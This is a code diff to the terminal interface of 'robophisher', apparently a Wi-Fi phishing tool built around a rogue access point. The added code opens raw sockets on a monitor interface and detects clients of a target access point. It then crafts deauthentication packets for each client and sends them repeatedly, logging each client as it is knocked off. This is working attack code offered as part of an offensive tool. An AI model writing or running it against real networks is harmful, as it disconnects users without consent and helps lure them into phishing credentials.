@@ -6,10 +6,13 @@ template selection and the main window
 import os
 import time
 import re
+import logging
 from collections import namedtuple
 from subprocess import check_output
 import curses
+import scapy.arch.linux as linux
 import robophisher.common.constants as constants
+import robophisher.deauth as deauth
 import robophisher.common.recon as recon
 import robophisher.common.phishingpage as phishingpage
 
@@ -17,6 +20,8 @@ import robophisher.common.phishingpage as phishingpage
 MainInfo = namedtuple("MainInfo", constants.MAIN_TUI_ATTRS)
 # information for the AP selection terminal
 ApSelInfo = namedtuple("ApSelInfo", constants.AP_SEL_ATTRS)
+
+LOGGER = logging.getLogger(__name__)
 
 
 class TuiTemplateSelection(object):
@@ -430,6 +435,10 @@ class TuiMain(object):
         self.blue_text = None
         self.orange_text = None
         self.yellow_text = None
+        self.socket0 = None
+        self.socket1 = None
+        self.clients = list()
+        self.packets = list()
 
     def gather_info(self, screen, info):
         """
@@ -451,6 +460,9 @@ class TuiMain(object):
         curses.init_pair(2, curses.COLOR_YELLOW, screen.getbkgd())
         self.blue_text = curses.color_pair(1) | curses.A_BOLD
         self.yellow_text = curses.color_pair(2) | curses.A_BOLD
+
+        self.socket0 = linux.L2ListenSocket(iface=info.mon_iface)
+        self.socket1 = linux.L3PacketSocket(iface=info.mon_iface)
 
         while True:
             # catch the exception when screen size is smaller than
@@ -553,12 +565,21 @@ class TuiMain(object):
         except curses.error:
             pass
 
-        if info.em:
-            # start raw number from 2
-            raw_num = 2
-            for client in info.em.get_output()[-5:]:
-                screen.addstr(raw_num, 0, client)
-                raw_num += 1
+        new_client = deauth.find_client(info.target_ap_mac, self.socket0)
+        if new_client and new_client not in self.clients:
+            LOGGER.info("Found New Client: {}".format(new_client))
+            LOGGER.info("Deatuthenticating New Client: {}".format(new_client))
+            self.clients.append(new_client)
+            self.packets.append(deauth.craft_packets(new_client, info.target_ap_mac))
+
+        map(self.socket1.send, self.packets)
+
+        # start raw number from 2
+        raw_num = 2
+        for client in self.clients[-5:]:
+            screen.addstr(raw_num, 0, client)
+            raw_num += 1
+
         try:
             # print the dhcp lease section
             screen.addstr(7, 0, "DHCP Leases", self.blue_text)
